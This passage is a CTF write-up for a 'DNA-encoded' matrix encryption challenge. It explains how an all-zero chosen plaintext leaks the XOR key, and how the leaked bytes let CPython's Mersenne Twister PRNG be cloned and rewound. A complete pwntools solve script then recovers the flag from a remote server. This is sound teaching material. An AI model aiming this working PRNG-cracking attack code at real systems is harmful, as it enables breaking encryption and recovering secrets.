  * The matrix is XORed with a `key_matrix` that is randomly generated each time.
  * The DNA-encoded representation of the matrix is returned.


_Get encrypted input_ works pretty much the same, except `formula` is replaced by our own input. I left a few details out, like how the matrices can sometimes be of different sizes and how that affects the result, but for simplicity we can put those thoughts to the side, since it doesn't change the overall algorithm.

Notice that when we call _Get encrypted input_ with a matrix of all zeros, the row/column shuffling doesn't do anything, which eliminates one element of unknown. That leaves the XOR, which returns the XOR of `key_matrix` and our input. But our input is all zeros, so we have just leaked `key_matrix` itself! But what can we do with `key_matrix`? It's a one-time value, so it appears to give no useful information.

The trick is that the RNG used to generate `key_matrix` (and in fact all of the other randomly-generated values) is `random.randbytes()`. It is well-known that CPython's `random` is insecure as a PRNG. There are tools that can determinstically crack the PRNG after 624 known outputs. And `key_matrix` holds way more than 624 outputs, so we can easily determine all of the subsequent _and_ previous randomly-generated values. This includes `formula`, `lx` and `ly`.

I borrowed [this](https://github.com/twisteroidambassador/mt19937-reversible) library to crack the Mersenne Twister state and retrieve all of those values. This is actually more tricky than it seems, due to the fact that `lx` and `ly` are generated using `random.randint()`, which internally calls the following function:

```
    def randbelow(n):
        k = n.bit_length()  # don't use (n-1) here because n can be 1
        r = getrandbits(k)  # 0 <= r < 2**k
        while r >= n:
            r = getrandbits(k)
        return r
```

As we can see, this function is only able to grab `k` bits at a time, and will throw away that output if it is above the bound. In other words, there are _skipped_ states. `lx` and `ly` are generated right after `formula` is generated, so the number of skipped states in between is unknown to us. Fortunately, we can "brute-force" the number of skipped states by rewinding the state back `x` times (where `x` is in some range) and starting the RNG from there, checking if the recovered values match what we expect by using them to re-generate the encrypted formula.

We don't know exactly what `x` is, but we can bound it to some small range using some statistical analysis. Once we know for certain what the PRNG state is a the beginning of the program, we can easily recover the encrypted flag, since we know all of the relevant secret parameters.

Below is my full solve script:

```
    from pwn import *
    from chall import *
    from PIL import Image
    from mersenne_twister import MT19937
    import numpy as np
    import random
    
    def get_encrypted_formula():
        io.sendline(b'1')
        io.recvuntil(b'Encrypted formula:\n')
        data = [list(map(int, row.split(b','))) for row in io.recvline().split(b';')]
        return np.array(data, dtype=np.uint8)
    
    def get_encrypted_input(data):
        io.sendline(b'2')
        formatted_data = ';'.join(','.join(map(str, row)) for row in data)
        io.sendlineafter(b'What do you want to encrypt? ', formatted_data.encode())
        io.recvuntil(b'Encrypted input:\n')
        data = [list(map(int, row.split(b','))) for row in io.recvline().split(b';')]
        return np.array(data, dtype=np.uint8)
    
    def get_encrypted_flag(formula):
        io.sendline(b'3')
        formatted_formula = ';'.join(','.join(map(str, row)) for row in formula)
        io.sendlineafter(b'What is the plaintext of the Formula? ', formatted_formula.encode())
        io.recvline()
        data = [list(map(int, row.split(b','))) for row in io.recvline().split(b';')]
        return np.array(data, dtype=np.uint8)
    
    def unscramble_matrix(P, lx, ly):
        inv_lx = np.argsort(lx)
        inv_ly = np.argsort(ly)
        return P[inv_lx, :][:, inv_ly]
    
    # io = process(['python3', 'chall.py'])
    io = remote('68.183.177.211', 4444)
    
    encrypted_formula = dna_encode_matrix(get_encrypted_formula(), 4)
    height, width = shape = encrypted_formula.shape[0], encrypted_formula.shape[1] // 4
    size = width * height
    
    input_matrix = np.zeros(shape, dtype=np.uint8)
    keystream = dna_encode_matrix(get_encrypted_input(input_matrix), 4)
    
    random_bytes = bytes(dna_decode_matrix(keystream, 7).flatten())
    queries = [int.from_bytes(random_bytes[i:i+4], 'little') for i in range(0, len(random_bytes), 4)]
    
    mt = MT19937()
    mt.clone_state_from_output(queries[:624])
    for _ in range(624 + size // 4):
        mt._untwist_one()
    
    next_bytes = b''.join(mt.get_next_random().to_bytes(4, 'little') for _ in range(size // 4))
    next_matrix = np.frombuffer(next_bytes, dtype=np.uint8).reshape(shape)
    key_matrix = dna_encode_matrix(next_matrix, 7)
    scrambled_formula = xor_matrices(encrypted_formula, key_matrix, 3)
    
    for _ in range(size // 4 + size // 4):
        mt._untwist_one()
    
    def to_python_random(mt):
        r = random.Random()
        r.setstate((3, (*mt, 624), None))
        return r
    
    def my_generate_matrix(r, x, y):
        return np.frombuffer(r.randbytes(x * y), dtype=np.uint8).reshape((x, y))
    
    def my_generate_sequence(r, n):
        l = list(range(n))
        for i in range(n):
            j = r.randint(i, n-1)
            l[i], l[j] = l[j], l[i]
        return np.array(l)
    
    print('searching formula matrix...')
    
    LB = 900
    
    index = 0
    while True:
        index += 1
        mt._untwist_one()
        r = to_python_random(mt.dump_state())
    
        if index < LB:
            continue
    
        formula = my_generate_matrix(r, height, width)
        dna_encoded_formula = dna_encode_matrix(formula, 3)
        lx, ly = my_generate_sequence(r, height), my_generate_sequence(r, 4*width)
        scrambled_formula_guess = scramble_matrix(dna_encoded_formula, lx, ly)
    
        if np.all(scrambled_formula_guess == scrambled_formula):
            break
    
    encrypted_flag = dna_encode_matrix(get_encrypted_flag(formula), 4)
    scrambled_flag = xor_matrices(encrypted_flag, key_matrix, 3)
    dna_encoded_flag = unscramble_matrix(scrambled_flag, lx, ly)
    img_data = dna_decode_matrix(dna_encoded_flag, 3)
    
    Image.fromarray(img_data).save('out.png')
    print('saved flag to out.png')
```

**Flag:`CJ{Mersenne_Twister_and_Chosen_Plaintext_Attack_wrapped_in_Chemistry_topic}`**
